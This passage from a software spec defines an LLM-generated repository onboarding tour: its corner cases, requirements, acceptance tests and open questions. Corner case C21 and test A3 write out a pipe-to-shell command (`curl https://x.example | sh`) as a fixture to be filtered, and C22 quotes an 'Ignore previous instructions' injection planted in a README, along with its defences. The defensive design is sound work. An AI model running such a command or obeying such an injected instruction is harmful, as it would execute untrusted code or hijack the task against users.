  unimplementable. Whether that is a migration on `onboarding` or a new table is the
  planner's call; the requirement is that the key is structural.
- `FEATURE_MODELS` and `FeatureModelId` are **unchanged** — `onboarding` already exists
  (`platform.ts:43-50`).

---

## Corner cases

| ID | Case | Expected behaviour | Requirement |
| --- | --- | --- | --- |
| C1 | Repo imported but never indexed, or `repo_index_state.status = 'failed'` | Page renders "this repo isn't indexed yet", a *Resync* link to `POST /repos/:id/resync`, and a **disabled** *Generate*. No model call, no record written. This is the one hard refusal, and it is a rendered explanation, not a `5xx`. | R18 |
| C2 | Repo has one directory and three files | Architecture renders prose and a one-node diagram; `getCriticalPaths` returns at most one chain; guided reading lists the three files in rank order. No section is hidden for being small. | R2, R3, R6 |
| C3 | Repo is Python/Go — zero `.ts/.js` files, so `symbols`, `file_edges` and `file_rank` are all empty (`repo-intel/constants.ts:16`) | Architecture is built from the directory walk and config files alone and its `body` states that call-graph analysis does not cover this language; critical paths and guided reading render "not available for this repository's languages"; how-to-run and first tasks (via `todo_marker`) still work. | N6, C5 |
| C4 | `file_edges` empty but files exist | Architecture prose is written; `diagram` is `null` — never an empty string or a placeholder (`onboarding.system.md:35`). The client renders no diagram box rather than an empty one. | R2, R23 |
| C5 | `getCriticalPaths` returns `[]` | Critical paths renders "no dependency chains found — the import graph is empty or too shallow", not an empty card. | R3 |
| C6 | No `package.json`, no compose file, no Dockerfile | R5's whitelist is empty, so every emitted step is dropped and `dropped_steps` records the count. The section renders "no runnable configuration found in this repository". The rest of the tour is unaffected. | R4, R5 |
| C7 | Zero first-task candidates (fully tested repo, no TODOs, no phantom refs) | Section renders "nothing obvious to start on — this repository is unusually tidy". The model is not asked to invent one. | R8 |
| C8 | The model selects 6 tasks against a 3-column grid | Grid wraps to two rows of three; a partial final row left-aligns. Order is difficulty ascending. | R8, UX |
| C9 | A `package.json` script value is 400 characters, or a path is 180 characters | The command renders in a horizontally scrollable `<code>` whose Copy control copies the **full** string; paths middle-truncate with the full value in `title` and on copy. | R5, R23 |
| C10 | A directory name contains punctuation or a newline that breaks a mermaid node label | The code-rendered diagram quotes and strips per `onboarding.system.md:31-34`; if `mermaid.parse` still rejects it, `MermaidDiagram` suppresses and renders nothing (`MermaidDiagram.tsx:39-45`) rather than a syntax-error graphic. | R23 |
| C11 | Generation in flight for 60 s | *Generate* becomes *Generating…* and is disabled; on a regenerate the previous tour stays fully visible and *Regenerate* is disabled. Navigating away and back re-`GET`s and shows either the old tour or the new one — never a blank page. | R17, C15 |
| C12 | A file the tour links to was deleted after generation | The link renders struck-through and non-clickable with "no longer in the repo"; the section's counts exclude it; the header shows the stale marker. No automatic regeneration. | R11, R13 |
| C13 | **The single call fails outright** — no provider key, a 45 s timeout, a transport error, or `input_over_budget` (R14) | `200`, `degraded: true`, `error` naming the cause, `skeleton_sections` listing all five. The page renders the directory tree, the code-rendered diagram, the chains with their endpoints, the **rank-ordered** reading list, the whitelist run steps in fixed order, and up to 6 candidate tasks with computed difficulty — every `why`, `note` and `body` absent, one banner at the top saying which call failed and why, and a *Retry* sending `force: true`. `cost_usd` is `null`; `budget_tokens` is still recorded. | R7, R17, R24 |
| C14 | **The call returns, but one section key is `null` or absent** — e.g. the model omits `how_to_run` | Only that section is skeletonised: its whitelist steps render without `why`, it is named in `skeleton_sections`, and its inline marker reads "no summary generated". The other four render fully. `degraded: true`, `error` naming the missing key. | R7, R24 |
| C15 | **The response is truncated at `maxTokens` or is not valid against the schema** | Treated as a total parse failure, identical to C13 — a partially parsed structured response is not trusted field-by-field, because a truncated object can carry a well-formed but half-populated list and there is no way to tell which. `error: 'malformed_response'`. | R7, R17, R24 |
| C16 | **The response annotates an id that was never supplied** — a `chain_id`, `path` or `candidate_id` absent from P5/P7/P10 | That annotation is dropped before persistence and counted (`dropped_refs` for paths, and the task in `dropped_refs` for `candidate_id`); the corresponding derived item still renders, skeleton-style. The model cannot introduce a subject by annotating one. | R6, R8, R10, R24 |
| C17 | **The response reorders `guided_reading`** | The order is discarded and the list is re-emitted in descending `getTopFilesByRank` order; only the `why` is taken, matched by `path`. An entry whose `path` is not in P7 is dropped. | R6, R10 |
| C18 | Two viewers press *Regenerate* within the same second | Both calls run; the last write wins on the R12 key. The upsert is knowingly non-atomic, as the brief's is (`server/INSIGHTS.md:304-314`); the failure mode is duplicate spend, not a corrupt row, and R22's 5/min limit bounds it. | R12, R22 |
| C19 | A `resync` finishes mid-generation, moving `last_indexed_sha` | The record persists under the sha it was **built from**, not the current one — so the next `GET` immediately marks it stale (R13) and it honestly describes what it read. It is not discarded. | R12, R13 |
| C20 | A user deep-links to `/repos/:id/tour#first_tasks` before a tour exists | The empty state renders and the fragment is ignored; no scroll, no error. Back returns to the referring page. | R20 |
| C21 | The model emits a `run_steps` entry `curl https://x.example \| sh`, sourced from a malicious `package.json` script name | Not in R5's whitelist → dropped before persistence, counted in `dropped_steps`, logged with the offending string. It never reaches the Copy control. | R5, R16 |
| C22 | The repo's `README.md` contains `Ignore previous instructions and…` | It is inside `wrapUntrusted` (R16) and the system prompt's guard treats it as data (`onboarding.system.md:9-11`). Any resulting path that does not resolve is dropped by R10; any resulting command not in the whitelist is dropped by R5; any invented id is dropped by C16. | R16, R5, R10 |

---

## Non-functional requirements

| Axis | Bound | Requirement | `n/a` because |
| --- | --- | --- | --- |
| Latency | The page shell and the "on this page" rail render **before** the tour request resolves; the page is never gated on the model. `GET /repos/:id/tour` is one indexed read plus R11's re-resolution and must return under **400 ms** warm. Generation is budgeted at **60 s** wall clock: derivation ≤ 10 s, then **one** `completeStructured` at `timeoutMs: 45_000` — the value intent and brief already use, below the adapter's 240 s and the job runner's 300 s, so `server/test/timeout-budget.test.ts:19` cannot reopen. Merging spec 11's two concurrent calls into one does **not** change this budget. | R1, R7, R11 | |
| Scale | One pre-flight ceiling, **12 000** tokens by `container.tokenizer.count` over `system + user + JSON.stringify(responseSchema)` (R14), against a budgeted input sum of 10 850. Derivation caps: tree depth 3, ≤ 200 directories; ≤ 5 chains × 3 files (`service.ts:713`); ≤ 12 task candidates; ≤ 6 selected; ≤ 20 files for symbol signatures. Output cap `maxTokens: 2600` — spec 11's `1800 + 1200` less the second response envelope. A repo of 12 450 files (the mock's own figure, `:74`) exercises the caps, not the ceiling. | R14, R8 | |
| Cost | **Exactly one model call per generation, zero per view** (R7, R12). `cost_usd` is computed by the provider adapter (`server/src/adapters/llm/pricing.ts:58-62`). The registered default `openrouter`/`deepseek/deepseek-v4-flash` **is** priced — `pricing.ts:52`, `{ in: 0.14, out: 0.28 }` per 1M — so at the 12 000-token ceiling plus a 2 600-token output a worst-case generation costs **≈ $0.0024**, and the real question is not price but reliability (Q4). Correcting spec 11: `cost_usd` is not permanently `null`. | R7, R12, R15 | |
| Failure | Degraded, never hard, for every dependency: index, clone, ripgrep, discovery, the model call. The only hard refusal is C1. Every other failure produces a **stored, rendered skeleton** (R24) with an honest reason. | R17, R18, R24 | |
| Security | Untrusted: every path, symbol name, script name and value, env-var name, compose service name, TODO text and document body — all wrapped per R16. Two outputs escape the page into the world and both are gated in code: a **command** a human is invited to paste into a shell (R5's whitelist) and a **path** rendered as a link (R10 at write, R11 at read). No `.env`/`.env.local` value is read; `.env.example` contributes names only. Nothing from the model is ever executed server-side. | R5, R10, R11, R16 | |
| Accessibility | Each section header is a real `<button>` with `aria-expanded`/`aria-controls`; the rail is a `<nav>` of real anchors reachable by Tab in document order; every Copy control is a labelled button announcing the copy, not the icon-only `<span>` the mock draws (`:55`). The rendered mermaid `<svg>` carries a text alternative naming the directories it shows. The skeleton banner (R24) is an `role="status"` region so a screen-reader user learns the prose is missing rather than meeting silently unlabelled cards. | R23, R24, R20 | |
| i18n | Every string is a key under the existing `onboarding` namespace (R21), including the three difficulty labels, every per-section empty message, and every R24 skeleton status line. `sectionCount` uses the explicit `{count, number}` form — a bare `{count}` is string interpolation (`client/INSIGHTS.md:227-235`). Paths, commands and env-var names are never translated (`onboarding.system.md:45-47` already states this for the model). | R21 | |
| Observability | R15's single trace block makes a bad tour diagnosable cold: which inputs were dropped, how close the call ran to its ceiling, **how far `budget_tokens` drifted from the provider's `tokens_in`** (the measurement that exposed the brief's 612-vs-2 006 envelope gap, `server/INSIGHTS.md:286-302`), how many paths R10 rejected, how many commands R5 rejected, and which sections were skeletonised. Without them this feature has no trace at all — a standalone `POST` has no `run_traces` row. | R15, R24 | |

---

## Acceptance criteria — EARS

| ID | Criterion | Req | Verify by |
| --- | --- | --- | --- |
| A1 | **When** a viewer opens a repo whose `indexed_sha`, indexer version, prompt version, provider and model are unchanged since the last tour, the server **shall** return the cached `TourRecord` and **shall** make no model call. | R12 | server `tour.it.test.ts` — mock LLM whose call counter reads exactly **1** after two `POST`s |
| A2 | **The** tour service **shall** persist and render only paths that resolve in the derived fact set at generation time. | R10 | server hermetic `tour-grounding.test.ts` — fixture output naming `src/does-not-exist.ts`; asserts absence and `dropped_refs === 1` |
| A3 | **The** tour service **shall not** persist a `run_steps[].command` absent from the whitelist derived from the repo's config facts. | R5 | server hermetic `tour-steps.test.ts` — fixture emitting `curl https://x.example \| sh`; asserts absence and `dropped_steps === 1` |
| A4 | **The** tour service **shall not** persist a `tasks[]` entry whose `candidate_id` is absent from the candidate set supplied to **the** call. | R8, C16 | server hermetic `tour-tasks.test.ts` — fixture inventing `cand_zz`; asserts it is dropped |
| A5 | **The** tour service **shall** set each task's `difficulty` from the R9 rubric and **shall** discard any `difficulty` in the model response. | R9 | server hermetic `tour-difficulty.test.ts` — table-driven over `(C,P)` boundaries `(2,49)`, `(3,49)`, `(15,89)`, `(16,0)`, `(0,90)`, plus a fixture asserting `"high"` is overridden to `"low"` |
| A6 | **The** tour service **shall** measure the call's input as `system + user + JSON.stringify(responseSchema)` with `container.tokenizer.count` and **shall** keep it at or below **12 000** tokens on every call it makes. | R14 | server hermetic `tour-budget.test.ts` — `ContainerOverrides.tokenizer` counting fixture; asserts the measured string contains the serialized schema and the measure is ≤ 12 000 |
| A7 | **If** the input still exceeds 12 000 after every droppable input is removed, **then** the server **shall not** make the call and **shall** persist a skeleton record with `error: 'input_over_budget'` and all five sections in `skeleton_sections`. | R14, R24 | server hermetic test — 5 000-file fixture; asserts LLM invocation count `0` and the persisted record's derived sections are non-empty |
| A8 | **The** tour service **shall** issue exactly **one** `completeStructured` invocation per generation, with `maxRetries: 0`. | R7 | server hermetic `tour-service.test.ts` — asserts invocation count `1` and the `maxRetries` argument |
| A9 | **If** the call fails or times out, **then** the server **shall** return `200` with `degraded: true` and a record whose directory tree, diagram, chains, rank-ordered reading list, whitelist run steps and task candidates are all populated, and whose `body`/`why`/`note` fields are all null. | R7, R17, R24, C13 | server `tour.it.test.ts` — LLM mock that throws; asserts each derived collection non-empty and every prose field null |
| A10 | **When** a stored path no longer resolves against the current index, the client **shall** render it non-interactive with a "no longer in the repo" note and **shall not** navigate on click. | R11, C12 | `TourView.test.tsx` — record with one deleted path against a fixture index; asserts no `href`/`onClick` and the note present |
| A11 | **When** `repo_index_state.last_indexed_sha` differs from the record's `indexed_sha`, the client **shall** show the stale marker with the record's 7-character sha and **shall not** fire a regeneration on render. | R13 | `TourView.test.tsx` — asserts `shortSha` renders and no mutation fires on rerender |
| A12 | **Where** the repo has no index or its index status is `failed`, the client **shall** render the not-indexed explanation with a disabled *Generate*. | R18, C1 | `TourView.test.tsx` (`status: 'failed'` fixture) · `e2e/specs/13-onboarding-tour.flow.json` |
| A13 | **Where** no tour has been generated, the client **shall** render the generate CTA with a token estimate and a time estimate rather than nothing. | R1, Q2 | `TourView.test.tsx` (query resolves `null`) · `e2e/specs/13-onboarding-tour.flow.json` |
| A14 | **The** client **shall** render all five sections in the order architecture → critical paths → how to run → guided reading → first tasks, with one "on this page" anchor per section. | R20, design `:3-13,71` | `TourView.test.tsx` (asserts DOM order and one anchor per `kind`) · `e2e/specs/13-onboarding-tour.flow.json` |
| A15 | **The** model input **shall** enclose every repository-derived string in `<untrusted>` blocks and **shall** place instructions and the output schema outside them. | R16 | server hermetic `tour-prompt.test.ts` — asserts each derived field appears only between delimiters, and that a `README` containing `</untrusted>` is escaped (`reviewer-core/src/prompt.ts:46`) |
| A16 | **The** tour service **shall not** include any value read from `.env` or `.env.local` in the model input. | R4, Security | server hermetic `tour-prompt.test.ts` — clone fixture with a sentinel secret in `.env`; asserts the sentinel is absent from the captured input |
| A17 | **The** persisted `TourRecord` **shall** carry exactly one trace block — `budget_tokens`, `tokens_in`, `tokens_out`, `cost_usd`, `provider`, `model`, `prompt_version` — with `budget_tokens`, `provider`, `model` and `prompt_version` non-null even on a skeleton generation, and `tokens_in`/`tokens_out`/`cost_usd` null when no call was made. | R15, R24 | server `tour.it.test.ts` — asserts the column set on the success path and on the A7 refusal path |
| A18 | **The** recorded `tokens_in` for a real generation **shall** be within 15 % of `budget_tokens`, or the discrepancy **shall** be logged at `warn` with both numbers. | R14, R15 | server hermetic test on the comparison helper · one manual generation against a real imported, indexed repo, reading both columns back by SQL |
| A19 | **The** `POST /repos/:id/tour` route **shall** reject the 6th request in a minute with `429`. | R22 | server `tour.it.test.ts` on its own Fastify instance — a shared one leaks rate-limit state (`specs/10-pr-brief.md` A18's lesson) |
| A20 | **The** client **shall** render no hardcoded user-facing string on the tour page; every string **shall** resolve through the `onboarding` namespace. | R21 | `TourView.test.tsx` under `NextIntlClientProvider`; a missing key throws |
| A21 | **Where** the architecture `diagram` is `null` or fails `mermaid.parse`, the client **shall** render the section body with no diagram container and **shall not** throw. | R23, C4, C10 | `TourView.test.tsx` with `diagram: null` and with `diagram: "flowchart LR\nA[[broken"` |
| A22 | **The** nav **shall** contain an `onboarding-tour` entry pointing at `/repos/:repoId/tour`; `/onboarding` **shall** continue to render the add-repository form; and `activeKeyFor('/onboarding')` **shall not** return `"onboarding-tour"`. | R20 | `helpers.test.ts` (asserts both `activeKeyFor` mappings) · `e2e/specs/13-onboarding-tour.flow.json` (nav click reaches the tour) · existing `e2e/specs/06-onboarding.flow.json` still green |
| A23 | **When** a section's derived input set is empty, the client **shall** render that section's named empty message and **shall not** render an empty card. | C5, C6, C7 | `TourView.test.tsx` — three fixtures, one per empty section |
| A24 | **The** `guided_reading` list **shall** be emitted in strictly non-increasing `file_rank` order, and **shall** preserve that order when the model response lists the same paths in a different order. | R6, C17 | server hermetic `tour-reading-order.test.ts` — fixture ranks `[0.9, 0.5, 0.2]` with a model response in reverse; asserts persisted order matches rank order, both on success and on the skeleton path |
| A25 | **The** `OnboardingSection.kind` field **shall** reject any value outside the five-section enum. | R19 | server hermetic contract test parsing `kind: 'not-a-section'` and asserting the parse fails — the narrowing is a typecheck-time claim otherwise |
| A26 | **When** the response omits or nulls a single section key, the client **shall** render that section's derived facts with a "no summary generated" marker and **shall** render the other four sections in full. | R24, C14 | `TourView.test.tsx` — record with `skeleton_sections: ['how_to_run']`; asserts the whitelist steps render and the marker is present |
| A27 | **The** tour **shall** be generated and rendered correctly against a real imported and indexed repository, not only the seeded demo. | R2, R3, R6 | **manual** — import and index a real repo, generate, and check that critical paths and guided reading are non-empty. `server/INSIGHTS.md:129-141`: the seeded demo returns "index unavailable" from every `repo-intel`-backed path forever, so a green suite proves nothing here |

---

## Traps

1. **The seeded demo repo cannot exercise this feature at all.** Every `repo-intel`-backed
   path returns "index unavailable" against the seed (`server/INSIGHTS.md:129-141`), and
   four of the five sections are `repo-intel`-backed. A fully green `pnpm test` plus a
   passing e2e flow is compatible with the feature never having produced a single real
   chain. A27 exists for exactly this.
2. **The skeleton is not the empty state and not an error page.** R24 renders *content*.
   The tempting shortcut — return early on a call failure and let the existing error card
   handle it — deletes the whole point of this revision, and no test that only asserts
   `degraded: true` will catch it. A9 asserts the derived collections are non-empty.
3. **`modules/blast` is the wrong door.** It is PR-scoped
   (`BlastService.forPull(workspaceId, prId)`, `server/src/modules/blast/service.ts:27`) and
   `specs/08-blast-radius.md:56-59` says that is deliberate. The arbitrary-file entry point
   is `repoIntel.getBlastRadius(repoId, changedFiles)` (`repo-intel/service.ts:221`).
   Reaching into `modules/blast` also trips `pnpm arch`'s `no-cross-module-internals`.
4. **`getCriticalPaths` is not a UI-to-DB trace and must not be described as one.** It
   greedily follows the highest-ranked import target from the top 5 ranked files, two hops
   (`service.ts:670-713`). The index is JS/TS-only (`constants.ts:16`) and knows nothing
   about SQL, HTTP clients or layers, so no cross-stack "request reaches the database" edge
   exists anywhere in this repo. The section is honest as "the chains that most of the code
   depends on"; it is a lie as "how a request travels to the database". Do not give the
   model a section title that invites the second reading.
5. **The pre-flight counter is a floor, not the billed number.** Measured on the first real
   brief: gate `612`, billed `2 006` (`server/INSIGHTS.md:286-302`,
   `specs/10-pr-brief.md:417-450`). R14 counts the serialized response schema for that
   reason, and this feature's five-section schema is substantially larger than the brief's.
   A named token allowance was the alternative and is rejected: it goes stale the instant the
   schema gains a field. See Q8 on whether A-3's `× 2` factor should also apply here.
6. **`onboarding.system.md` exists and is already half-right.** It has the security
   paragraph, the grounding rules, the mermaid rules and a `{{sections}}` placeholder — but
   it names `routes_and_apis`, which this spec drops, and it invites the model to author the
   diagram, which R2 forbids. Editing it is part of the work.
7. **`client/messages/en/onboarding.json` describes a different feature.** Its
   `generate.body:10` lists five sections that are not these five (R21).
8. **The `onboarding` table cannot hold the cache key.** One row per repo, no key columns
   (`schema/context.ts:120-126`). Persisting into it as-is silently discards R12 and the tour
   never goes stale.
9. **Never hand-write the migration** (`server/AGENTS.md`) — edit the table in
   `server/src/db/schema/context.ts` and run `pnpm db:generate`.
10. **`client/src/vendor/ui/nav.ts` is vendored** (`CLAUDE.md` *Do not touch*). R20's entry
    is a deliberate exception, made in the same change as the page, and it is the only edit
    to that file. Adding the row early produces a nav item that 404s (`nav.ts:33-35`).
11. **`/onboarding` is the add-repo wizard**, and `helpers.ts:29` already mis-highlights for
    it. The tour goes at `/repos/[repoId]/tour` (R20), and the predicate moves with it —
    changing one without the other leaves two routes fighting over one nav key.

---

## Open questions

Q1–Q7 are carried from `specs/11-onboarding-tour.md` **already resolved**; their
resolutions are restated so this file stands alone, and they are not re-opened. Q4 remains
flagged for the CTO. Q8–Q9 are new to this revision. Every row states a default, and each
default is what ships if nobody answers.

| ID | Question | Resolution / proposed default | Blocks |
| --- | --- | --- | --- |
| Q1 | The mock draws a *Share link* (`:76`) but no sharing surface exists. | **Resolved: omit it.** An export is a separate feature (`design-mocks/src/20-screen_export.jsx`); an in-app URL is already the address bar. | nothing |
| Q2 | The empty state promises *"30–60s and ~5,000 tokens"* (`:64`). | **Resolved, restated for one call:** the CTA says "up to ~12,000 tokens, 30–60s", from R14's single ceiling, and is revised from real `tokens_in` once a handful of tours exist — the way `risk_brief`'s default model was revised. | A13's exact string |
| Q3 | Each critical-path file has an *Open* button (`:50`), but the client has no file-viewer route. | **Resolved: link to the file at the repo's host provider at the tour's `indexed_sha`**, new tab. One line, and honest about what it can do. | nothing — R11 governs the dead-link case either way |
| Q4 | Is `openrouter`/`deepseek/deepseek-v4-flash` the right default for a five-section structured response? | **RESOLVED 2026-08-26 by the CTO: no — repointed to `anthropic`/`claude-haiku-4-5`.** We do not use OpenRouter, so the registered default resolved to a provider with no configured key and every out-of-the-box generation would have degraded to a skeleton — the feature's first impression would have been its failure path. The new default matches `review_intent` and `risk_brief`, the two sibling features that also derive facts first and narrate second, and is priced (`pricing.ts:35`, $1/$5 per 1M ≈ $0.025 a generation). The `deepseek` entry is priced too (`pricing.ts:52`), so this is not a cost or coverage decision — it is a key-availability one. | the Cost NFR is measurable, and R24's skeleton is an exception path rather than the default experience |
| Q5 | Should attached project-context documents be an input, or only discovered ones? | **Resolved: discovered, not attached** (P6). Attachments are scoped to an agent or a skill (`schema/project-context.ts:26-47`), never to a system feature, and `specs/09-project-context.md:61-69` puts that out of scope. | nothing |
| Q6 | Does the tour regenerate automatically after a `resync`? | **Resolved: on demand only.** R12 makes it a cache miss and R13 marks it stale; auto-regeneration would spend money on every index of every repo, unprompted. | nothing |
| Q7 | Is depth 3 enough for the architecture tree in a monorepo like this one? | **Resolved: depth 3**, with deeper directories rolled into their depth-3 ancestor's file count and named in that ancestor's note. Revisit if a real repo's tree reads as flat. | nothing |
| Q8 | `specs/10-pr-brief.md` A-3 defines the brief's ceiling in **billed** tokens and estimates them as `ceil(count(...) × 2)`. R14 here keeps spec 11's raw pre-flight count. Should the `× 2` framing apply? | **Default: no, not yet.** The `× 2` rounds up a single Anthropic measurement; this feature's default provider is OpenRouter, so importing the factor imports an unmeasured assumption. Ship the raw count with the schema included, let A18 log the residual, and re-derive from the first ten real generations — at which point the ceiling becomes billed-token-denominated in one amendment. | the meaning, not the number, of the 12 000 ceiling |
| Q9 | On a skeleton (R24), should the page still offer *Retry* automatically on load, or only as a button? | **Default: button only.** An auto-retry on a page that renders useful content spends money on every visit to a repo whose model is misconfigured — exactly Q4's failure mode, multiplied by traffic. | nothing |

---

## Could not establish

- **Whether `deepseek/deepseek-v4-flash` produces reliable structured output at this
  schema's size.** It is the registered default (`platform.ts:43-50`), priced
  (`pricing.ts:52`), and **no code path has ever called it** — so there is no evidence in
  this repository either way, and merging two schemas into one five-section object makes the
  question harder rather than easier. R7's `maxRetries: 0` means a malformed response is a
  skeleton, not a retry. Q4.
- **The real ratio between R14's pre-flight count and the provider's `tokens_in` for this
  schema.** The only measurement in this repository is the brief's 612-vs-2 006
  (`server/INSIGHTS.md:286-302`, `specs/10-pr-brief.md:417-450`), on a smaller schema and a
  different provider. The 12 000 ceiling is **reasoned from the merge arithmetic above, not
  measured**, and should be re-derived from the first ten real generations. Q8.
- **How `getCriticalPaths` behaves on a real repository.** Its output on the seeded demo is
  empty by construction (`server/INSIGHTS.md:129-141`) and I did not run it against an
  imported repo. Whether five chains of depth 2 read as a useful section, or as five
  near-identical chains through the same hub file, is unknown. If it is the latter, R3 needs
  a chain-deduplication rule.
- **The real distribution of first-task candidates.** All four generators (R8) are plausible
  from the schema, but I have no measurement of how many `TODO` markers, untested `core`
  files or unresolved references a typical imported repo yields. A repo with 400 TODOs and
  one with none are both handled (the cap and C7); which is typical decides whether the
  section is useful or noise.
- **Whether `container.codeIndex.grep`'s pure-Node fallback (`ripgrep.ts:50-54`) is fast
  enough on a 12 450-file repo** for the `todo_marker` generator inside the 10 s derivation
  budget. `@vscode/ripgrep` is an optional dependency resolved at runtime; I did not measure
  the fallback.
- **Whether a skeleton reads as useful or as broken to a real newcomer.** R24 is a design
  judgement — that facts without prose beat an error card — and it has no precedent in this
  product to check it against. The nearest analogue is the brief's degraded record
  (`specs/10-pr-brief.md:403-413`), which renders an explanation, not content.
